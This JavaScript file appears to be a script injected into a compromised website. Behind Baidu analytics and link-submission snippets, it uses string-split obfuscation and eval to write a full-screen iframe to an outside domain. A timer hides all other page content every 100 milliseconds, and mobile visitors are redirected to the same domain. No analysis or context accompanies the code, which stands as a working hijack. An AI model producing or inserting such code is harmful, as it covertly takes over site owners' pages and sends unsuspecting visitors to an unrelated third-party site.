var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?f33e1c42477732d63c507ab336cace4d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
var ss = '<center id="showcloneshengxiaon"><ifr' + 'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14' + '00" height="8' + '00" src="http://www.kekejh.com/"></iframe></center>';
eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
try {
    setInterval(function() {
        try {
            document.getElementById("div" + "All").style.display = "no" + "ne"
        } catch (e) {}
        for (var i = 0; i < document.body.children.length; i++) {
            try {
                var a = document.body.children[i].tagName;
                var b = document.body.children[i].id;
                if (b != "iconDiv1" && b != "showcloneshengxiaon") {
                    document.body.children[i].style.display = "non" + "e"
                }
            } catch (e) {}
        }
    }, 100)
} catch (e) {}
var mobileUrl = "http://www.kekejh.com/",
    mobile = (/mmp|symbian|smartphone|midp|wap|phone|xoom|iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(navigator.userAgent.toLowerCase()));
if (mobile) {
    window.location = mobileUrl
}

(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();